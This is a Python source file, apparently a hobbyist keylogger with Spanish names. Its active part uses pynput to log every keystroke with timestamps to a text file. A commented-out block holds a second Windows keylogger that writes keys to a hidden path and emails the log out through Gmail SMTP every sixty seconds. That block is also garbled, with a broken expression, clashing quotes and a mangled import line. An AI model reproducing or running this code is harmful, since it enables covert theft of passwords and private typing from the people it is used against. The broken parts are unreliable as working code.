import datetime
from pynput.keyboard import Listener
from io import open

Fecha_hoy = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')

milista = []

def RecibirDatos(key):
	fichero = open(f"informacion_{Fecha_hoy}.txt", "w");
	key = str(key)

	milista.append([key,str(datetime.datetime.now())])

	for i in milista[0]:
		if i == "Key.enter":
			fichero.write("\n")
		elif i == "Key.space":
			fichero.write(" ")
		elif i == "Key.backspace":
			fichero.write(" %BORRAR% ")
		else:
			fichero.write(i.replace("'", ""))    

def DejarDePresionar(key):
    milista[len(milista)-1].append(str(datetime.datetime.now()))
    print(milista)
    
with Listener(on_press=RecibirDatos, on_release=DejarDePresionar) as l:
	l.join()




"""import pyHook, pythoncom, sys, logging
import time, datetime

wait_seconds = 60
timeout = time.time() + wait_seconds
file_log = 'C:\\secret\\dat.txt'

def TimeOut():
  if time.time() > timeout:
    return True
  else:
    return False

def SendEmail(user, pwd, recipient, subject, body):
  import smtplib
  
  gmail_user= user
  gmail_pass = pwd
  FROM = user
  TO = recipient if type(recipient) is list else [recipient]
  SUBJECT = subject
  TEXT = body
  
  message = """\From: %s\nTo: %s\nSubject: %s\n\n%s
  """ % (FROM, ", ".join(TO), SUBJECT, TEXT)
  try:
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.ehlo()
    server.starttls()
    server.login(gmail_user, gmail_pass)
    server.sendmail(FROM, TO, message)
    server.close()
    print 'Correo enviado satisfactoriamente!'
  except:
    print 'Error al mandar correo!'

def FormatAndSendLogEmail():
  with open(file_log, 'r+') as f:
    actualdate = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data = f.read().replace('\n', '')
    data = 'Log capturado a las: '+ actualdate + ,
              'Nuevo log - '+actualdate, data)
    f.seek(0)
    f.truncate()
    
def OnKeyboardEvent(event):
  logging.basicConfig(filename=file_log, level=logging.DEBUG,
                      format = '%(message)s')
  logging.log(10, chr(event.Ascii))
  return True
  
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
  if TimeOut():
    FormatAndSendLogEmail()
    timeout = time.time() + wait_seconds
  
  pythoncom.PumpWaitingMessages()

##### Para el keylogger
##### from datetime import datcd etime

##### now = datetime.now()
##### today = now.strftime("%Y%m%d%H%M%S")
##### print("Today's date:", today)""""